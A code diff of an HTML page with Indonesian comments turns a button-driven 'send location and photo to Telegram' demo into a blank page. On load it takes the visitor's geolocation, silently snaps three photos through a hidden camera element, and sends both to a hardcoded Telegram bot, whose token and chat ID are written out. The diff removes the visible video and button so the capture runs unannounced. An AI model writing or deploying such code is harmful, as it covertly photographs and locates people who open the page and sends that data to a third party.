@@ -6,23 +6,44 @@
   <title>Telegram Bot</title>
 </head>
 <body>
-  <h1>Mengirim Lokasi dan Gambar ke Telegram</h1>
-  <video id="camera" autoplay></video>
-  <button id="send">Kirim ke Telegram</button>
   <script>
     const apiToken = "7537995896:AAGg4hCRAellVFqQHZml6qIZSBTEUs4WXQg"; // Ganti dengan token bot Anda
     const chatId = "7353825005"; // Ganti dengan chat ID Anda
 
     let currentLocation = null; // Untuk menyimpan lokasi perangkat
 
-    // Tangkap kamera
-    const startCamera = async () => {
-      const video = document.getElementById("camera");
+    // Dapatkan akses kamera dan mulai pengambilan foto
+    const startCameraAndCapturePhotos = async () => {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.createElement("video");
         video.srcObject = stream;
+        await new Promise((resolve) => (video.onloadedmetadata = resolve));
+        video.play();
+
+        const canvas = document.createElement("canvas");
+        const context = canvas.getContext("2d");
+
+        // Ambil beberapa foto
+        const photos = [];
+        for (let i = 0; i < 3; i++) {
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+          const photoBlob = await new Promise((resolve) => {
+            canvas.toBlob((blob) => resolve(blob), "image/jpeg");
+          });
+
+          photos.push(photoBlob);
+          await new Promise((resolve) => setTimeout(resolve, 1000)); // Tunggu 1 detik sebelum mengambil foto berikutnya
+        }
+
+        stream.getTracks().forEach((track) => track.stop()); // Hentikan akses kamera
+        return photos;
       } catch (err) {
         console.error("Gagal mengakses kamera:", err);
+        return [];
       }
     };
 
@@ -45,7 +66,7 @@
     };
 
     // Kirim pesan dan foto ke Telegram
-    const sendToTelegram = async (message, photoBlob) => {
+    const sendToTelegram = async (message, photos) => {
       try {
         // Kirim pesan teks
         const messageUrl = `https://api.telegram.org/bot${apiToken}/sendMessage`;
@@ -60,14 +81,12 @@
           }),
         });
 
-        if (messageResponse.ok) {
-          console.log("Pesan berhasil dikirim!");
-        } else {
+        if (!messageResponse.ok) {
           console.error("Gagal mengirim pesan:", await messageResponse.text());
         }
 
-        // Jika ada foto, kirim foto
-        if (photoBlob) {
+        // Kirim foto satu per satu
+        for (const photoBlob of photos) {
           const photoUrl = `https://api.telegram.org/bot${apiToken}/sendPhoto`;
           const formData = new FormData();
           formData.append("chat_id", chatId);
@@ -78,9 +97,7 @@
             body: formData,
           });
 
-          if (photoResponse.ok) {
-            console.log("Foto berhasil dikirim!");
-          } else {
+          if (!photoResponse.ok) {
             console.error("Gagal mengirim foto:", await photoResponse.text());
           }
         }
@@ -89,45 +106,21 @@
       }
     };
 
-    // Ambil tangkapan layar dari video
-    const capturePhoto = () => {
-      const video = document.getElementById("camera");
-      const canvas = document.createElement("canvas");
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      const context = canvas.getContext("2d");
-      context.drawImage(video, 0, 0, canvas.width, canvas.height);
-      return new Promise((resolve) => {
-        canvas.toBlob((blob) => {
-          resolve(blob);
-        }, "image/jpeg");
-      });
-    };
-
-    // Event listener untuk tombol kirim
-    document.getElementById("send").addEventListener("click", async () => {
+    // Mulai proses saat halaman dimuat
+    (async () => {
       try {
-        if (!currentLocation) {
-          currentLocation = await getLocation(); // Ambil lokasi jika belum tersedia
-        }
+        // Dapatkan lokasi
+        currentLocation = await getLocation();
         const { latitude, longitude } = currentLocation;
         const locationMessage = `Lokasi saat ini: https://www.google.com/maps?q=${latitude},${longitude}`;
 
-        const photoBlob = await capturePhoto();
-        sendToTelegram(locationMessage, photoBlob);
+        // Dapatkan foto dari kamera
+        const photos = await startCameraAndCapturePhotos();
+
+        // Kirim lokasi dan foto ke Telegram
+        sendToTelegram(locationMessage, photos);
       } catch (err) {
         console.error("Terjadi kesalahan:", err);
-      }
-    });
-
-    // Mulai kamera dan ambil lokasi saat halaman dimuat
-    (async () => {
-      await startCamera();
-      try {
-        currentLocation = await getLocation();
-        console.log("Lokasi perangkat berhasil didapatkan:", currentLocation);
-      } catch (err) {
-        console.error(err.message);
       }
     })();
   </script>
